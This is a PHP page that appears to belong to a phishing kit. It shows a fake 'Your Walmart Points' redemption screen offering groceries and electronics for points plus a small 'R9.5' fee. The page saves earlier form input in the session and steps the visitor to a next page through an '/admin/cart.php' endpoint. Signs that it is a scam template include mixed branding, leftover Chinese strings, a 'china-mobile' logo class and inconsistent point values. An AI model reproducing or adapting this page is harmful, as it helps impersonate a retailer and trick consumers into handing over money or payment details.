<?php
session_start();

// include('partials/header.php');
include('header_.php');



if (isset($_POST['submit'])) {
    $_SESSION['step1Data'] = $_POST;
}

$productList = [
    [
        'product_name' => "Omo Stain Remove Auto Laundry Capsules 16 Pack*2",
        'product_price' => '2,400 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/1.jpg'
    ],
    [
        'product_name' => "PnP Full Cream Fresh Milk 2L*2",
        'product_price' => "2,450 Pts",
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/2.jpg'
    ],
    [
        'product_name' => "Lancewood Cheddar 900g",
        'product_price' => '2,490 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/3.jpg'
    ],
    [
        'product_name' => "Nescafe Classic Coffee 200g",
        'product_price' => '2,710 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/4.jpg'
    ],
    [
        'product_name' => "Crafted Collection Roast Lamb with Basil Pesto 1kg",
        'product_price' => 'R9.5+3200 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/5.jpg'
    ],
    [
        'product_name' => "Let's Cook Spicy Lamb Stew 800g",
        'product_price' => 'R9.5+3,400 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/6.jpg'
    ],
    [
        'product_name' => "PnP Rack of Lamb P/1kg",
        'product_price' => 'R9.5+3,450 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/7.jpg'
    ],
    [
        'product_name' => "PnP Prime Rib Roast with Bone-in - Avg Weight 2.4kg",
        'product_price' => 'R9.5+3,500 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/8.jpg'
    ],
    [
        'product_name' => "Prestige 24 Piece Cutlery Set",
        'product_price' => 'R9.5+3,500 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/9.jpg'
    ],
    [
        'product_name' => "Smartfit Fitness Tracker Beat",
        'product_price' => 'R9.5+4,000 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/10.jpg'
    ],
    [
        'product_name' => "Volkano Stun Series Bluetooth Speaker Black",
        'product_price' => 'R9.5+4,100 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/11.jpg'
    ],
    [
        'product_name' => "AirPods Pro (2nd generation)",
        'product_price' => '$9.5+4,300 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/12.jpg'
    ],
    [
        'product_name' => "Apple HomePod Wireless Smart Speaker",
        'product_price' => 'R9.5+4,300 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/13.jpg'
    ],
    [
        'product_name' => "Sony Headphones MDR-ZX110NC",
        'product_price' => 'R9.5+4,360 Pts',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/14.jpg'
    ],
    
];

?>
    <style>
        .wrap {
            /* margin-top:70px; */
            padding:30px 30px;
        }
        @media(max-width: 767px) {
            .loader-wrap {
                display: flex;
                width: 100%;
                height: 100%;
                position: fixed;
                top: 0;
                left: 0;
                align-items: center;
                justify-content: center;
                z-index: 99999999999999;
                background: rgba(255, 255, 255, 1);
            }

            .loader-wrap .loading {
                display: flex;
                flex-direction: column;
                align-items: center;
            }

            .loader-wrap .loading img.china-mobile-logo-img {
                width: 200px;
            }

            .loader-wrap .loading img {
                width: 80px;
            }
            .box{
                background: #0071dc;
                padding:30px 20px;
                border-radius:8px;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .section_1{
                width:50%;
            }
            .section_2{
                width:50%;
            }
            .inner_box {
                display:flex;
                flex-direction:column;
            }
            .inner_box > span {
                color:#fff;
            }
            .inner_box > b {
                color:#fff;
            }
            .product_area {
                margin-top:12px;
            }
            .product_area > b {
                color:#0071dc;
            }
            .product_list {
                display: grid;
                align-items: center;
                justify-content: center;
                text-align: center;
                grid-template-columns: auto auto;
            }
            .product_s {
                width: 85%;
                border: 1px solid #efefef;
                margin: 5px;
                padding:12px;
                height: 300px;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
            }
            .product_s > p {
                margin-bottom: 5px;
                font-size: 15px;
                font-weight: 500;
            }
            .p_name {

            }
            .p_image {
                width:100%;
            }
            .p_quantity {
                color: #0071dc;
            }
            .p_cart{
                padding: 4px;
                background: #2870d3;
                color: #fff;
                border: 0px;
                width: 100%;
                border-radius: 12px;
            }
            .update_qty > input:focus{
                outline:none;
            }
            .update_qty > input:active{
                outline:none;
            }
            .update_qty > input {
                outline:none;
                border:0px;
                width:90px;
                text-align:center;
            }
            .update_qty {
                margin-bottom:8px;
                border-radius:8px;
                padding:3px;
                display: flex;
                align-items: center;
                justify-content: center;
                border: 1px solid;
            }
            .next_page {
                padding: 12px;
                background: #0071dc;
                color: #fff;
                border: 0px;
                width: 100%;
                border-radius: 12px;
            }
        }
        .wrap > b {
            color: #0071dc;
        }
    </style>
    <div class="wrap">
        <b>
            <i class="fa fa-chevron-left"></i> Your Walmart Points
        </b>
        <div class="box">
            <div class="section_1">
                <div class="inner_box">
                    <span>Available points</span>
                    <input type="hidden" id="totalValue" value="5000" />
                    <b>4605</b>
                </div>
            </div>
            <div class="section_2">
                <div class="inner_box">
                    <span>Unsaved points</span>
                    <b>0</b>
                </div>
            </div>
        </div>
        <div class="product_area">
            <b>
                Redeem rewards
            </b>
            <div class="product_list">
                <input type="hidden" value="" id="totalPrice" />
                <?php foreach($productList as $k => $products) { ?>
                    <div class="product_s">
                        <img class="p_image" src="<?php echo $folder_path;?>/<?php echo $products['product_image']  ?>" />
                        <p class="p_name"><?php echo $products['product_name'] ?></p>
                        <p class="p_quantity"><?php echo $products['product_price'] ?></p>
                        <input type="hidden" id="price<?php echo $k ?>" value="<?php echo $products['price'] ?>" />
                        <input type="hidden" id="final_price<?php echo $k ?>" value="" />
                        <div class="update_qty">
                            <i class="fa fa-plus" onclick="up(<?php echo $k ?>)"></i>
                            <input type="number" disabled value="0" id="qty<?php echo $k ?>" />
                            <i class="fa fa-minus" onclick="down(<?php echo $k ?>)"></i>
                        </div>
<!--                        <button class="p_cart">大車</button>-->
                    </div>
                <?php
                    }
                ?>
            </div>
        </div>
        <br>
        <br>
        <div class="nextPage">
            <div id="progress-loading" style="display:none;text-align:center;"><img style="width:60px; height:auto;" src="../loading.gif" /></div>
            <button class="next_page" id="carBtn" onclick="goToNextPage()">Exchange</button>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script>
        setTimeout(() => {
            jQuery('.loader-wrap').hide();
        }, 3000);
        let totalValue = Number($('#totalValue').val());
        let calculateValue = 0;
        let quantity = 0;
        function up(val) {
            let totalPrice = Number($('#totalPrice').val());
            if(calculateValue >= totalValue) {
                alert('Exceeds available points');
                console.log("value already exeeded");
            } else {
                let value = Number($('#qty' + val).val()) + 1;
                quantity = value;
                $('#qty' + val).val(value);
                let productPrice = Number($('#price' + val).val());
                let finalValue = productPrice * value;
                calculateValue = finalValue;
                console.log("totalPrice ===>", finalValue);
                $('#totalPrice').val(calculateValue);
                if (finalValue > totalValue) {
                    alert('Exceeds available points');
                }
            }
        }
        function down(val) {
            let value = Number($('#qty'+val).val()) - 1;
            quantity = value;
            let totalPrice = Number($('#totalPrice').val());
            if(value >= 0) {
                $('#qty' + val).val(value);
                let productPrice = Number($('#price'+val).val());
                console.log("productPrice ==>",productPrice);
                console.log("totalPrice ==>",totalPrice);
                let finalValue = calculateValue - productPrice;
                console.log("finalValue ===>",finalValue);
                calculateValue = finalValue;
                $('#totalPrice').val(finalValue);
            }
        }
        function goToNextPage() {
            let totalPrice = Number($('#totalPrice').val());
            console.log('totalPrice ===>',totalPrice);
            console.log('totalValue ===>',totalValue);
            console.log('quantity ===>',quantity);
            let formData = {
                total_quantity:quantity
            }
            $("#progress-loading").show();
            $('#carBtn').prop('disabled',true);
            $.ajax({
                url:"/admin/cart.php",
                type:"POST",
                data:formData,
                success: function(response) {
                    $("#progress-loading").hide();
                    console.log("response ===>",response);
                    window.location.href='page3.php';
                },
                error: function(error) {
                    $("#progress-loading").hide();
                    $('#carBtn').prop('disabled',false);
                    console.log("error ===>",error);
                }
            });
            // if(calculateValue >= totalValue) {
            //     alert('超出可用積分');
            // } else {
            //     window.location.href='page3.php';
            // }
        }
    </script>
<?php
include('footer_.php');
